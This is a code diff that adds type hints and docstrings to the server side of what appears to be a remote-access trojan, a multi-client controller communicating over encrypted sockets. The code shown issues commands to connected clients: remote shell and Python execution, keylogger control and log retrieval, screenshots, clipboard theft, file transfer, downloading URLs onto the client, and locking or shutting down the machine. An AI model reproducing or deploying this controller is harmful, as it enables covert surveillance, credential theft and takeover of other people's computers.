@@ -48,7 +48,8 @@ turtle_help = """--h | See this Help Message
 --s | Shutdown Server"""
 
 
-def read_file(path, block_size=1024):
+def read_file(path, block_size=1024) -> bytes:
+    """ Generator for reading files """
     with open(path, 'rb') as f:
         while True:
             piece = f.read(block_size)
@@ -58,14 +59,15 @@ def read_file(path, block_size=1024):
                 return
 
 
-def Hasher(MESSAGE):
-
+def Hasher(MESSAGE) -> bytes:
+    """ Hashes data """
     digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
     digest.update(MESSAGE)
     return digest.finalize()
 
 
-def verifySignature(publicKey, signature, message):
+def verifySignature(publicKey, signature, message) -> bool:
+    """ Verify signature with public key """
     try:
         publicKey.verify(
             signature,
@@ -81,7 +83,8 @@ def verifySignature(publicKey, signature, message):
         return False
 
 
-def sign(privateKey, data):
+def sign(privateKey, data) -> bytes:
+    """ Sign data with private key """
     signature = privateKey.sign(
         data,
         padding.PSS(
@@ -93,7 +96,8 @@ def sign(privateKey, data):
     return signature
 
 
-def encrypt(publicKey, plaintext):
+def encrypt(publicKey, plaintext) -> bytes:
+    """ Encrypt using public key """
     ciphertext = publicKey.encrypt(
         plaintext,
         padding.OAEP(
@@ -104,7 +108,8 @@ def encrypt(publicKey, plaintext):
     return ciphertext
 
 
-def decrypt(privateKey, ciphertext):
+def decrypt(privateKey, ciphertext) -> bytes:
+    """ Decrypt using private key """
     plaintext = privateKey.decrypt(
         ciphertext,
         padding.OAEP(
@@ -116,7 +121,8 @@ def decrypt(privateKey, ciphertext):
     return plaintext
 
 
-def public_bytes(publicKey):
+def public_bytes(publicKey) -> bytes:
+    """ Get Public Key in Bytes """
     serializedPublic = publicKey.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo
@@ -124,7 +130,8 @@ def public_bytes(publicKey):
     return serializedPublic
 
 
-def errors(ERROR, line=True):
+def errors(ERROR, line=True) -> str:
+    """ Error Handler """
     error_class = ERROR.__class__.__name__
     error_msg = '%s' % error_class
     try:
@@ -141,17 +148,19 @@ def errors(ERROR, line=True):
     return error_msg
 
 
-def json_dumps(data):
+def json_dumps(data) -> bytes:
+    """ Dump json data and encode it """
     return json.dumps(data).encode()
 
 
 def json_loads(data):
+    """ Decode data and json load it """
     return json.loads(data.decode())
 
 
 class MultiServer(object):
 
-    def __init__(self, host='', port=9999):
+    def __init__(self, host='', port=9999) -> None:
         self.host = host
         self.port = port
         self.socket = None
@@ -159,7 +168,7 @@ class MultiServer(object):
         self.all_connections = []
         self.all_addresses = []
 
-    def socket_create(self):
+    def socket_create(self) -> None:
         """ Create Socket """
         try:
             self.socket = socket.socket()
@@ -170,7 +179,7 @@ class MultiServer(object):
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         return
 
-    def socket_bind(self):
+    def socket_bind(self) -> None:
         """ Bind socket to port and wait for connection from client """
         try:
             self.socket.bind((self.host, self.port))
@@ -181,7 +190,7 @@ class MultiServer(object):
             self.socket_bind()
         return
 
-    def recvall(self, conn, n):
+    def recvall(self, conn, n) -> bytes:
         """ Helper function to recv n bytes or return None if EOF is hit
         :param n:
         :param conn:
@@ -200,27 +209,27 @@ class MultiServer(object):
         target = self.all_connections.index(conn)
         return self.all_keys[target]
 
-    def receive(self, conn, _print=True):
+    def receive(self, conn, _print=True) -> bytes:
         """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
-        Fer = self.get_key(conn)
+        KEY = self.get_key(conn)
 
-        length = int(Fer.decrypt(conn.recv(2048)).decode())
+        length = int(KEY.decrypt(conn.recv(2048)).decode())
         conn.send(b'<RECEIVED>')
-        received = Fer.decrypt(self.recvall(conn, length))
+        received = KEY.decrypt(self.recvall(conn, length))
         if _print:
             print(received.decode())
         return received
 
-    def send(self, conn, data):
+    def send(self, conn, data) -> None:
         """ Send Buffer Size and Data to Client Encrypted with Connection Specific AES Key """
-        Fer = self.get_key(conn)
+        KEY = self.get_key(conn)
 
-        encrypted = Fer.encrypt(data)
-        conn.send(Fer.encrypt(str(len(encrypted)).encode()))
+        encrypted = KEY.encrypt(data)
+        conn.send(KEY.encrypt(str(len(encrypted)).encode()))
         conn.recv(1024)
         conn.send(encrypted)
 
-    def accept_connections(self, _print=True):
+    def accept_connections(self, _print=True) -> None:
         """ Accepts incoming connections and agrees on a AES key using RSA"""
         while 1:
             try:
@@ -286,7 +295,7 @@ class MultiServer(object):
                 del publicKey
                 logging.debug(errors(e))
 
-    def list_connections(self, _print=True):
+    def list_connections(self, _print=True) -> None:
         """ List all connections """
         results = ''
         for i, conn in enumerate(self.all_connections):
@@ -304,7 +313,7 @@ class MultiServer(object):
             print('----- Clients -----' + '\n' + results)
         return
 
-    def get_target(self, cmd):
+    def get_target(self, cmd) -> socket.socket:
         """ Select target client
         :param cmd:
         """
@@ -322,7 +331,7 @@ class MultiServer(object):
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return conn
 
-    def send_file(self, conn, file_to_transfer, save_as):
+    def send_file(self, conn, file_to_transfer, save_as) -> None:
         """ Send file from Server to Client """
         # returns None
         self.send(conn, json_dumps(['SEND FILE', save_as]))
@@ -334,7 +343,7 @@ class MultiServer(object):
         self.send(conn, b'<FILE TRANSFER DONE>')
         self.receive(conn)
 
-    def receive_file(self, conn, file_to_transfer, save_as):
+    def receive_file(self, conn, file_to_transfer, save_as) -> None:
         """ Transfer file from Client to Server """
 
         self.send(conn, json_dumps(['RECEIVE FILE', file_to_transfer]))
@@ -348,23 +357,23 @@ class MultiServer(object):
                 self.send(conn, b'<RECEIVED>')
         self.receive(conn)
 
-    def _get_log(self, conn):
+    def _get_log(self, conn) -> str:
+        """ Get Log File Name"""
         self.send(conn, json_dumps(['LOG_FILE']))
         return self.receive(conn, _print=False).decode()
 
-    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))):
+    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))) -> (bool, str):
         """ Take screenshot on Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['SCREENSHOT']))
         data = self.receive(conn, _print=False).decode()
         if data == '<ERROR>':
             self.send(conn, b'<RECEIVING>')
-            error = self.receive(conn, _print=False)
-            return False, error
+            return False, self.receive(conn, _print=False)
         self.receive_file(conn, data, save_as)
-        return True, None
+        return True, save_as
 
-    def client_exec(self, conn, command):
+    def client_exec(self, conn, command) -> str:
         """ Remote Python Interpreter """
         # returns command_output/None
         self.send(conn, json_dumps(['EXEC', command]))
@@ -374,7 +383,7 @@ class MultiServer(object):
         if data[0] != '':
             return data[0]
 
-    def python_interpreter(self, conn):
+    def python_interpreter(self, conn) -> None:
         """ Remote Python Interpreter CLI"""
         print('CAUTION! Using this feature wrong can break the client until restarted.')
         print('Tip: help("modules") lists available modules')
@@ -386,7 +395,7 @@ class MultiServer(object):
             if not result == None:
                 print(result.rstrip("\n"))
 
-    def client_shell(self, conn, command, _print=True):
+    def client_shell(self, conn, command, _print=True) -> (str, str):
         """ Remote Shell with Client """
         # returns command_output, cwd
         system = self.get_platform(conn)
@@ -426,55 +435,57 @@ class MultiServer(object):
         cwd = self.get_cwd(conn)
         return result, cwd
 
-    def get_platform(self, conn):
+    def get_platform(self, conn) -> str:
         """ Get Client Platform """
         # platform.system()
         self.send(conn, json_dumps(['<PLATFORM>']))
         return self.receive(conn, _print=False).decode()
 
-    def get_cwd(self, conn):
+    def get_cwd(self, conn) -> str:
         """ Get Client cwd """
         # returns cwd
         self.send(conn, json_dumps(['<GETCWD>']))
         return self.receive(conn, _print=False).decode()
 
-    def start_keylogger(self, conn):
+    def start_keylogger(self, conn) -> bool:
         """ Start Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['START_KEYLOGGER']))
         return json_loads(self.receive(conn, _print=False))[0]
 
-    def keylogger_status(self, conn):
+    def keylogger_status(self, conn) -> bool:
         """ Get Keylogger Status """
         # returns True/False
         self.send(conn, json_dumps(['KEYLOGGER_STATUS']))
         return json_loads(self.receive(conn, _print=False))[0]
 
-    def stop_keylogger(self, conn):
+    def stop_keylogger(self, conn) -> bool:
         """ Stop Keylogger """
         # returns True/False
         self.send(conn, json_dumps(['STOP_KEYLOGGER']))
         return json_loads(self.receive(conn, _print=False))[0]
 
-    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))):
+    def get_log(self, conn, save_as='{}.log'.format(str(datetime.now()).replace(':','-'))) -> str:
         """ Transfer log to Server """
         # save_as: file name
         log = self._get_log(conn)
         self.receive_file(conn, log, save_as)
         return save_as
 
-    def get_info(self, conn, _print=True):
+    def get_info(self, conn, _print=True) -> str:
+        """ Get Client Info """
         self.send(conn, json_dumps(['INFO']))
-        return self.receive(conn, _print=_print)
+        return self.receive(conn, _print=_print).decode()
 
-    def fill_clipboard(self, conn, data):
+    def fill_clipboard(self, conn, data) -> (bool, str):
+        """ Copy to Client Clipboard"""
         # data[0]: True/False
         # data[1]: None/error
         self.send(conn, json_dumps(['COPY', data]))
         data = json_loads(self.receive(conn, _print=False))
         return data[0], data[1]
 
-    def get_clipboard(self, conn, _print=False):
+    def get_clipboard(self, conn, _print=False) -> (bool, str):
         """ Get Client Clipboard """
         # data[0]: True/False
         # data[1]: clipboard/error
@@ -484,7 +495,7 @@ class MultiServer(object):
             print(data[1])
         return data[0], data[1]
 
-    def _get_info(self, conn):
+    def _get_info(self, conn) -> list:
         """ Get Client Info """
 
         # info = [
@@ -496,14 +507,14 @@ class MultiServer(object):
         self.send(conn, json_dumps(['<INFO>']))
         return json_loads(self.receive(conn, _print=False))
 
-    def download(self, conn, url, file_name):
+    def download(self, conn, url, file_name) -> (bool, str):
         """ Download File To Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['DOWNLOAD', url, file_name]))
         data = json_loads(self.receive(conn, _print=False))
         return data[0], data[1]
 
-    def restart_session(self, conn):
+    def restart_session(self, conn) -> bool:
         """ Restart Client Session """
         # returns True
         self.send(conn, json_dumps(['RESTART_SESSION']))
@@ -511,7 +522,7 @@ class MultiServer(object):
         self.list_connections(_print=False)
         return True
 
-    def disconnect(self, conn):
+    def disconnect(self, conn) -> bool:
         """ Disconnect Client """
         # returns True
         self.send(conn, json_dumps(['DISCONNECT']))
@@ -520,24 +531,24 @@ class MultiServer(object):
         self.list_connections(_print=False)
         return True
 
-    def lock(self, conn):
+    def lock(self, conn) -> bool:
         """ Lock Client Machine (Windows Only) """
         self.send(conn, json_dumps(['LOCK']))
         return self.receive(conn, _print=False)
 
-    def shutdown(self, conn):
+    def shutdown(self, conn) -> None:
         """ Shutdown Client Machine """
         self.send(conn, json_dumps(['SHUTDOWN']))
         self.list_connections(_print=False)
         return
 
-    def restart(self, conn):
+    def restart(self, conn) -> None:
         """ Restart Client Machine """
         self.send(conn, json_dumps(['RESTART']))
         self.list_connections(_print=False)
         return
 
-    def shell(self, conn):
+    def shell(self, conn) -> None:
         """ Remote Shell Interface """
         cwd = self.get_cwd(conn)
         command = ''
@@ -558,7 +569,7 @@ class MultiServer(object):
                 break
             _, cwd = self.client_shell(conn, command)
 
-    def selector(self, conn, command):
+    def selector(self, conn, command) -> bool:
         if '--b' in command:
             return True
         if '--e' in command:
@@ -662,13 +673,14 @@ class MultiServer(object):
         if '--g' in command:
             print('Taking Screenshot...')
             self.screenshot(conn)
+            print('Saved Screenshot.')
             return
         if '--h' in command:
             print(interface_help)
             return
         print("Invalid command: '--h' for help.")
 
-    def broadcast(self, command):
+    def broadcast(self, command) -> None:
         connections = self.all_connections[:]
         addresses = self.all_addresses[:]
         for conn in connections:
@@ -678,7 +690,7 @@ class MultiServer(object):
             except Exception as e:
                 print(errors(e))
 
-    def interface(self, conn):
+    def interface(self, conn) -> None:
         """ CLI Interface to Client """
         ip = self.all_addresses[self.all_connections.index(conn)][0]
         while True:
@@ -686,7 +698,7 @@ class MultiServer(object):
             if self.selector(conn, command):
                 break
 
-    def turtle(self):
+    def turtle(self) -> None:
         """ Connection Selector """
         print("Type '--h' for help")
         while True:
@@ -728,14 +740,14 @@ class MultiServer(object):
                 print(errors(e))
 
 
-def accept_conns(server):
+def accept_conns(server) -> None:
     server.socket_create()
     server.socket_bind()
     server.accept_connections()
     return
 
 
-def accept_thread(server):
+def accept_thread(server) -> None:
     t = threading.Thread(target=accept_conns, args=(server,))
     t.daemon = True
     t.start()
